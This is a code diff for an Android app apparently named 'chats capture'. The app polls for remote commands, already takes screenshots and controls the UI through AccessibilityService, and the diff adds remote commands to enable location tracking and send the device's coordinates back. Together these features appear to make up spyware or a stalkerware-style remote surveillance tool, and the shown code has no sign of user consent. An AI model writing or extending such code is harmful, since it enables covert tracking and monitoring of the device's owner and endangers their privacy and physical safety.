@@ -171,6 +171,12 @@ class CommandPollingManager(private val context: Context) {
                 return
             }
             
+            // Handle location commands
+            if (action == "enable_location" || action == "disable_location" || action == "get_location") {
+                executeLocationCommand(commandId, action)
+                return
+            }
+            
             // Handle UI control commands (require AccessibilityService)
             if (action.startsWith("ui_")) {
                 executeUICommand(commandId, action, commandData.parameters)
@@ -223,6 +229,43 @@ class CommandPollingManager(private val context: Context) {
             }
         } catch (e: Exception) {
             Timber.e(e, "Error executing screenshot command: $commandId")
+            reportCommandResult(commandId, false, "Error: ${e.message}", null)
+        }
+    }
+    
+    /**
+     * Execute location command
+     */
+    private suspend fun executeLocationCommand(commandId: String, action: String) {
+        try {
+            val locationService = com.chats.capture.services.LocationService(context)
+            val result = when (action) {
+                "enable_location" -> {
+                    locationService.startTracking()
+                    Pair(true, "Location tracking enabled successfully")
+                }
+                "disable_location" -> {
+                    locationService.stopTracking()
+                    Pair(true, "Location tracking disabled successfully")
+                }
+                "get_location" -> {
+                    val location = locationService.getCurrentLocation()
+                    if (location != null) {
+                        val locationInfo = "Lat: ${location.latitude}, Lng: ${location.longitude}, Accuracy: ${location.accuracy}m"
+                        Pair(true, locationInfo)
+                    } else {
+                        Pair(false, "Location not available")
+                    }
+                }
+                else -> {
+                    Pair(false, "Unknown location command: $action")
+                }
+            }
+            
+            reportCommandResult(commandId, result.first, result.second, null)
+            Timber.d("Location command executed: id=$commandId, action=$action, success=${result.first}")
+        } catch (e: Exception) {
+            Timber.e(e, "Error executing location command: $commandId")
             reportCommandResult(commandId, false, "Error: ${e.message}", null)
         }
     }
